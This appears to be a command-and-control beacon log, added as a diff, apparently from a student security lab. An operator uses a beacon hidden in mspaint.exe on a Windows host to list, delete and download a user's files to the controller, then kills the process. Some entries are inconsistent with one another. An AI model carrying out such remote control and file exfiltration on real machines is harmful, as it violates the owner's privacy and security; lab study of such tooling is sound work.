@@ -1,0 +1,103 @@
+12/15 08:02:07 UTC [metadata] 192.168.43.167 <- 192.168.43.167; computer: ACER; user: david; process: mspaint.exe; pid: 5376; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/15 08:02:20 UTC [input] <neo> cd ..
+12/15 08:02:20 UTC [task] <> cd ..
+12/15 08:03:04 UTC [checkin] host called home, sent: 10 bytes
+12/15 08:03:13 UTC [input] <neo> ls
+12/15 08:03:13 UTC [task] <> Tasked beacon to list files in .
+12/15 08:04:04 UTC [checkin] host called home, sent: 19 bytes
+12/15 08:04:04 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/15/2022 14:42:00	.
+D	0	12/13/2022 17:46:30	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	21092	12/14/2022 09:01:27	black_noun_002_03536.jpg
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+D	0	12/13/2022 13:37:47	Installed
+F	19597	12/14/2022 09:12:31	oracal-631-light-yellow-mat.jpg
+D	0	12/15/2022 15:00:55	testcap
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/15 08:04:34 UTC [input] <neo> rm back.jpg
+12/15 08:04:35 UTC [task] <T1107, > Tasked beacon to remove back.jpg
+12/15 08:05:04 UTC [checkin] host called home, sent: 16 bytes
+12/15 08:05:19 UTC [input] <neo> ls
+12/15 08:05:19 UTC [task] <> Tasked beacon to list files in .
+12/15 08:06:04 UTC [checkin] host called home, sent: 19 bytes
+12/15 08:06:04 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/15/2022 15:04:26	.
+D	0	12/13/2022 17:46:30	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	21092	12/14/2022 09:01:27	black.jpg
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+D	0	12/13/2022 13:37:47	Installed
+F	19597	12/14/2022 09:12:31	oracal-631-light-yellow-mat.jpg
+D	0	12/15/2022 15:00:55	testcap
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/15 08:06:04 UTC [input] <neo> ls
+12/15 08:06:04 UTC [task] <> Tasked beacon to list files in .
+12/15 08:06:21 UTC [input] <neo> rm black.jpg
+12/15 08:06:21 UTC [task] <T1107, > Tasked beacon to remove black.jpg
+12/15 08:07:04 UTC [checkin] host called home, sent: 36 bytes
+12/15 08:07:04 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/15/2022 15:04:26	.
+D	0	12/13/2022 17:46:30	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	21092	12/14/2022 09:01:27	black.jpg
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+D	0	12/13/2022 13:37:47	Installed
+F	19597	12/14/2022 09:12:31	oracal-631-light-yellow-mat.jpg
+D	0	12/15/2022 15:00:55	testcap
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/15 08:13:25 UTC [input] <neo> mkdir huy
+12/15 08:13:25 UTC [task] <> Tasked beacon to make directory huy
+12/15 08:14:04 UTC [checkin] host called home, sent: 11 bytes
+12/15 08:15:26 UTC [input] <neo> ls
+12/15 08:15:26 UTC [task] <> Tasked beacon to list files in .
+12/15 08:16:04 UTC [checkin] host called home, sent: 19 bytes
+12/15 08:16:04 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/15/2022 15:14:28	.
+D	0	12/13/2022 17:46:30	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+D	0	12/13/2022 13:37:47	Installed
+D	0	12/15/2022 15:08:32	testcap
+F	19597	12/14/2022 09:12:31	yellow.jpg
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/15 08:17:12 UTC [input] <neo> download yellow.jpg
+12/15 08:17:12 UTC [task] <T1005> Tasked beacon to download yellow.jpg
+12/15 08:18:04 UTC [checkin] host called home, sent: 18 bytes
+12/15 08:18:04 UTC [output]
+started download of C:\Users\david\Downloads\yellow.jpg (19597 bytes)
+
+12/15 08:18:04 UTC [output]
+download of yellow.jpg is complete
+
+12/15 08:21:24 UTC [input] <neo> kill 5376
+12/15 08:21:24 UTC [task] <> Tasked beacon to kill 5376
+12/15 08:22:04 UTC [checkin] host called home, sent: 12 bytes
